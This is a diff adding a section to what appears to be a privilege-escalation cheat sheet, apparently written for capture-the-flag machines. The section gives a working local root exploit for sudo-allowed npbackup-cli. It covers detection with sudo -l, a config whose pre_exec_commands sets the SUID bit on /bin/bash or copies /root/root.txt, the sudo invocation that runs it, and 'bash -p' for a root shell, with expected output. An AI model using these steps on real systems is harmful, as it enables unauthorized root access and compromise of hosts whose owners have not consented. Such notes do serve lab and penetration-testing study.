@@ -1615,3 +1615,61 @@ Do you want to choose a custom payload? y/n (n use default payload)  n
 uid=0(root) gid=1001(julian) groups=1001(julian)
 # 
 ```
+
+### npbackup-cli Privilege Escalation (Pre-Exec Command Injection)
+
+If you can run `npbackup-cli` with sudo and supply a custom config file, you can inject commands via `pre_exec_commands`.
+
+**Detection:**
+
+```bash
+sudo -l
+# (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
+```
+
+**Exploitation:**
+
+```bash
+# 1. Copy existing config (or create new one)
+cp /home/user/npbackup.conf /tmp/npbackup.conf
+
+# 2. Edit config - add pre_exec_commands under backup_opts
+vim /tmp/npbackup.conf
+```
+
+Add malicious command to config:
+
+```yaml
+groups:
+  default_group:
+    backup_opts:
+      pre_exec_commands: ["chmod +s /bin/bash"]
+      pre_exec_per_command_timeout: 3600
+      pre_exec_failure_is_fatal: false
+```
+
+Or to read root flag directly:
+
+```yaml
+      pre_exec_commands: ["cat /root/root.txt > /tmp/root.txt"]
+```
+
+**Execute with custom config:**
+
+```bash
+# Run backup with your malicious config (-f forces backup even if recent)
+sudo /usr/local/bin/npbackup-cli -c /tmp/npbackup.conf -b -f
+
+# Output shows command execution:
+# Pre-execution of command chmod +s /bin/bash succeeded with:
+# None
+
+# Get root shell
+bash -p
+# uid=1000(user) gid=1000(user) euid=0(root) egid=0(root)
+```
+
+**Key flags:**
+- `-c CONFIG_FILE` - Use custom config file
+- `-b` - Run backup (triggers pre_exec_commands)
+- `-f` - Force backup even if recent backup exists
